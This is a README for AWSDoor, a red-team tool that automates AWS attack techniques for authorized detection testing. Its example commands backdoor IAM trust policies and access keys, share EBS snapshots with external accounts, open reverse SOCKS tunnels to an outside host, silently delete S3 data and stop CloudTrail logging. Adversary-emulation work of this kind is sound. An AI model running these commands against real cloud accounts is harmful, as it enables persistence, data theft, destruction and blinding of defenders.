# AWSDoor

> This readme has been AI generated

**AWSDoor** is a red team automation tool designed to simulate advanced attacker behavior in AWS environments. It automates the deployment of persistence mechanisms, data exfiltration techniques, destructive operations, and defense impairment tactics, enabling security teams to test their detection and response capabilities against realistic cloud-native threats.

## 🔍 Purpose

As AWS becomes a critical infrastructure platform, attackers increasingly exploit its flexibility to maintain stealthy and durable access. AWSDoor helps red teams replicate these techniques in a controlled and auditable manner, supporting Threat-Led Penetration Testing (TLPT) and adversary emulation in cloud environments.

---

## 🚧 Future Improvements
AWSDoor is an evolving project. New techniques for persistence, exfiltration, evasion, and other attack vectors will be continuously added to reflect the latest developments in cloud threat landscapes. Stay tuned for upcoming updates!

## ✨ Features

### 1. Persistence Techniques
- **AccessKey Injection**: Add access keys to existing IAM users.
- **Trust Policy Backdooring**: Modify trust policies to allow external role assumption.
- **NotAction Policy Abuse**: Create overly permissive IAM policies using `NotAction`.
- **Lambda-Based Persistence**: Deploy backdoors via Lambda functions or poisoned Lambda layers.

### 2. Data Exfiltration
- **Snapshot Exfiltration**: Share EBS snapshots with external AWS accounts.
- **EC2 Reverse SOCKS**: Use EC2 and SSM to establish reverse SOCKS tunnels for lateral movement.

### 3. Destruction Techniques
- **S3 Shadow Deletion**: Deploy lifecycle policies to silently delete S3 data.
- **Leave Organization**: Detach AWS accounts from Organizations to evade governance and enable long-term compromise.

### 4. Defense Impairment
- **CloudTrail Logging Disruption**: Stop logging or modify event selectors to reduce visibility.
- **CloudWatch and Config Tampering**: Impair monitoring and alerting mechanisms.

---

## 🧪 Example Usage


### AccessKey Injection
```bash
python .\main.py -m AccessKey -u adele.vance
```

### Trust Policy Backdooring
```bash
python .\main.py -m TrustPolicy -r FAKEROLE -a 584739118107
```

### NotAction Policy Abuse
```bash
python .\main.py -m NotAction -r FAKEROLE -p ROGUEPOLICY
```

### Lambda-Based Persistence
```bash
python .\main.py -m AdminLambda -r FAKEROLE -n lambda_test2 -l
```
### Snapshot Exfiltration
```bash
python .\main.py -m EC2DiskExfiltration -i i-0021dfcf18a891b07 -a 503561426720
```
### EC2 Reverse SOCKS
```bash
python .\main.py -m EC2Socks -name i-0021dfcf18a891b07 -key "ssh-ed25519 AAAA..." -remotekey path/to/key.pem -user ec2-user -socksport 4444 -sshuser admin -sshhost 13.38.79.236 --method systemd
```

### CloudTrail Logging Disruption
```bash
python .\main.py --m CloudTrailStop -s 
```

### S3 Shadow Deletion
```bash
python .\main.py --m S3ShadowDelete -n s3bucketname
```

## 🙏 Acknowledgments
This tool was developed as part of internal R&D efforts at Wavestone. Special thanks to Wavestone for supporting the research and development of AWSDoor.

## 📚 Coming Soon
A full technical article will be published to provide in-depth explanations of each technique implemented in AWSDoor, including detection strategies and mitigation recommendations.
